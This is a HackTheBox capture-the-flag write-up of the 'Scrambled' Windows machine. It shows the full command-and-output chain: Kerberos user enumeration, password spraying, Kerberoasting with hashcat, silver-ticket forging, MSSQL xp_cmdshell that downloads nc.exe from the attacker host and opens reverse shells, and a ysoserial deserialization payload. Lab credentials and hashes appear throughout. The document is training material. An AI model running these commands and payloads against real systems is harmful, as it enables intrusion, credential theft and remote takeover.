---
title: HTB | Scrambled
author: Zeropio
date: 2022-09-01
categories: [Pentesting, HackTheBox]
tags: [htb, linux, medium, machines]
permalink: /pentesting/htb/machines/scrambled
---

# Fingerprint

The nmap show us that:

```
Nmap scan report for 10.10.11.168
Host is up (0.071s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-31 22:13:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-31T22:15:15+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-31T04:39:38
|_Not valid after:  2052-08-31T04:39:38
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-08-31T22:14:38
|_  start_date: N/A
```

Remember to add the following lines in the hosts to make it work:

```
10.10.11.168    scrm.local
10.10.11.168    DC1.scrm.local
```

# Foothold

We see an kerberos open, we can start enumerating users with this [wordlist](https://github.com/attackdebris/kerberos_enum_userlists/) and `kerbrute`:

```console
zero@pio$ 

	 >  [+] VALID USERNAME:  ASMITH@scrm.local
	 >  [+] VALID USERNAME:  KSIMPSON@scrm.local
	 >  [+] VALID USERNAME:  SJENKINS@scrm.local
	 >  [+] VALID USERNAME:  JHALL@scrm.local
	 >  [+] VALID USERNAME:  KHICKS@scrm.local
```

If we do a password spray with each user we found a valid login:

```console
zero@pio$ kerbrute passwordspray -d scrm.local --dc DC1.scrm.local finding/valid_users ksimpson

	>  [+] VALID LOGIN:  KSIMPSON@scrm.local:ksimpson
```

We can try requesting a TGT ticket:

```console
zero@pio$ impacket-getTGT scrm.local/ksimpson:ksimpson
zero@pio$ export KRB5CCNAME=ksimpson.ccache
```

For the next step we will need to made some adjustment in the scripts, as explained [here](https://github.com/SecureAuthCorp/impacket/issues/1206).

```console
zero@pio$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -no-pass

	$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$eee76754ccb373aee4f1863840cb6caa$c1e3b23d1cddf8ba5c744d131990c90ca2552eb7075ecdd6e85f77942055e678fc106480c3a5e8fb526ca7927a961bda6be52dfc5eb4874fbdea74697e670369fc1de2a9bfb7bee032c3d1e5c916633e6a5a105df8a97c4f0ca64a86cb3a5f53cff325f0a5ca5e51a361e82c1ec62ec5610a2c4dc6c0dd0f6b6a2146276b9437a1d6edd9addeed0cb7a5e281a057731cfba7d88406fa02a5954bed196e5be5682bed65b58a95114b0a0d2a788e9966d10f252e491792744ab3cf6b97595fb2a87141b911a15104f1626cf526b020a0c3d005f4bf3c2ac3827cfcff318f55d5acd1be35e26d9e145e07a719adcd56254aaa0abdc5cd4fe0a4b9a91cb7f74e4b1e813e1f97c8708bbb4ecde2116e57b1d19310dc9bce6b6c419eb8ba3024c404d18c757f757e309936e183a63e0ead072a3e7a6f8497d2b871b9235eb471aacbe959f4fcb1e982ebae3af50edefcb6f61a1e0d3cf18a0cdfbf286186f11207dafb4a8cbe1ac8eb331ff516b4c0cd449dc2772bc8a127e5689bc617ef6ba8bc4ba456f03a8ca1c3c8044e1e4e353500338aefef54f9e63548e70aae38b9fb9f9b17e53fb3f4f8f065d4e54456b5daa83eda4579c82a89cab473e109c91a9580f39b316854e386353eea6b8cace97234073284c3052a08223e0d894b5934df79bd64942b35221fde6a353fdd39ae1cfb6cc4fd75e5312e946d37057754b3f0db6de14b94b3841751b61b0ff6ca9d9724ad7ae42a75838665299d5e512967156d29e8dc54397d1a72c591584e10f590885d98a4c1c312408a2ee9e445069cd26c0a3b19b476b303795826be1f76a1f928b2226824f68b65d5874dfeb40b60ca53263cb96e471839a467d1c279f58afad62773151c0d07940beaeb43acf73f1547e745f18794bf6e74706d7388db39cca42b157d0b13693c723e8d5fe49aac9d04363036e0bb6a4dc0a4bab67b207e1dc6d3cd7d3aacbeee2b11d06078fd6a5efd09557bae517bc92ed9657817c7e1f917c9174b28d84abbefa1f10a651a91b50c563b6913c5c1b447af1a80a8a44b9749916c10189395817afd61698ae2509c3e403dd73240bedabca9bda9c7b15745cb13600937b99728f13f84f2d46dd064bb7f830387cca879f3e10362a2cbe67689186054f83bd05a9366cfc75207c63935027e930d09807a6a0015c1cef08fa5b9ab39df8843db4e21f9020a9972fd3832a493a6bd6c1e8b3629f319bc83ca322269b245f496541cfafeedac06f25701b00204d7077a47b3af536d7e8484292796e8f6b69aded74c2dc34a92292462b04c657da6a171f1c2f0af07f3622eeb8d4aa517d1ddf7b1f4bc0bee3fab2c81728d0e36498802d4097fd6eb1361bb5c77c6ae8eb2e08d2e88cf6b2b792eb69172345484d9ea5fe26c50e3e0588c97e4272528f96691077cafcaa59fa5ab47
```

We can crack it now with hashcat:

```console
zero@pio$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt

	...cafcaa59fa5ab47:Pegasus60

	Session..........: hashcat
	Status...........: Cracked
```

Convert the password to a ntlm format and get the domain SID:

```console
zero@pio$ impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug

	[+] Trying to connect to KDC at SCRM.LOCAL
	[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500
```

Now request a ticket:

```console
zero@pio$ impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200
zero@pio$ export KRB5CCNAME=Administrator.ccache
```

Now we can authenticate as `mssqclient`:

```console
zero@pio$ impacket-mssqlclient dc1.scrm.local -k -no-pass
```

We found a pair of credentials there:

```console
SQL> use ScrambleHR
	[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
	[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
SQL> select * from UserImport
	LdapUser                                             LdapPwd                                              LdapDomain                                           RefreshInterval   IncludeGroups   
	
	--------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------   
	
	MiscSvc                                              ScrambledEggs9900                                    scrm.local
```

We can even execute commands:

```console
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
	scrm\sqlsvc
```

Create a reverse shell:

```console
SQL> xp_cmdshell curl 10.10.16.44/nc.exe -o C:\Temp\nc.exe
SQL> xp_cmdshell C:\Temp\nc.exe -e powershell 10.10.16.44 443
```

```console
zero@pio$ nc -lvnp 443                   
	listening on [any] 443 ...
	connect to [10.10.16.44] from (UNKNOWN) [10.10.11.168] 65303
	Windows PowerShell 
	Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
	whoami
scrm\sqlsvc
```

# Privilege Escalation

We can use the previous founded credentials to execute commands:

```console
PS C:\Windows\system32> $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
PS C:\Windows\system32> $Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $SecPassword)
PS C:\Windows\system32> Invoke-Command -Computer dc1 -Credential $Cred -Command { whoami }
	scrm\miscsvc
```

Send a new reverse shell:

```console
PS C:\Windows\system32> Invoke-Command -Computer dc1 -Credential $Cred -Command { cmd /c C:\Temp\nc.exe -e powershell 10.10.16.44 4443 }
```

```console
zero@pio$ nc -lvnp 4443                  
	listening on [any] 4443 ...
	connect to [10.10.16.44] from (UNKNOWN) [10.10.11.168] 65316
	Windows PowerShell 
	Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\miscsvc\Documents> whoami
	scrm\miscsvc
```

We found a program running in the 4411 port:

```console
PS C:\Shares\IT\Apps\Sales Order Client> dir
	
	    Directory: C:\Shares\IT\Apps\Sales Order Client
	
	
	Mode                LastWriteTime         Length Name                                                                  
	----                -------------         ------ ----                                                                  
	-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                                    
	-a----       05/11/2021     20:52          19456 ScrambleLib.dll
```

We can use [ysoserial](https://github.com/pwntester/ysoserial.net) to generate a reverse shell in a Windows host:

```console
C:\scripts> .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\nc.exe -e powershell 10.10.16.44 9000"

	AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBM0FVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRZdU5EUWdPVEF3TUNJZ1UzUmhibVJoY21SRmNuSnZja1Z1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVTNSaGJtUmhjbVJQZFhSd2RYUkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRlZ6WlhKT1lXMWxQU0lpSUZCaGMzTjNiM0prUFNKN2VEcE9kV3hzZlNJZ1JHOXRZV2x1UFNJaUlFeHZZV1JWYzJWeVVISnZabWxzWlQwaVJtRnNjMlVpSUVacGJHVk9ZVzFsUFNKamJXUWlJQzgrRFFvZ0lDQWdJQ0E4TDNOa09sQnliMk5sYzNNdVUzUmhjblJKYm1adlBnMEtJQ0FnSUR3dmMyUTZVSEp2WTJWemN6NE5DaUFnUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVQySnFaV04wU1c1emRHRnVZMlUrRFFvOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNEwL
```

Copy the output and open a netcat to the machine in that port. Add `UPLOAD_ORDER;` and then our payload:

```console
zero@pio$ netcat 10.10.11.168 4411
	SCRAMBLECORP_ORDERS_V1.0.3;
	UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2V....
```

And then we should receive a connection in our netcat.